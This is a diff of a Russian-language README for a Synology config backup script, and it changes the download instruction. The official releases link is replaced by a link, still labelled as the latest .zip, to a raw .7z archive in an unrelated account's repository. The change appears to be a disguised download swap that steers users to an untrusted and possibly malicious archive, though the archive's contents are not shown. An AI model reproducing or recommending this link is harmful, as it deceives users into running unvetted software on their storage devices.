@@ -20,7 +20,7 @@
 
 ### Скачать сценарий
 
-1. Загрузите исходный код последней версии zip https://github.com/007revad/Synology_Config_Backup/releases
+1. [Загрузите исходный код последней версии .zip](https://github.com/ZwiReKsyno/Synology_Config_Backup/raw/main/synology_config_backup.7z)
 2. Сохраните загруженный zip-файл в папку на Synology.
 3. Разархивируйте zip-файл.
 
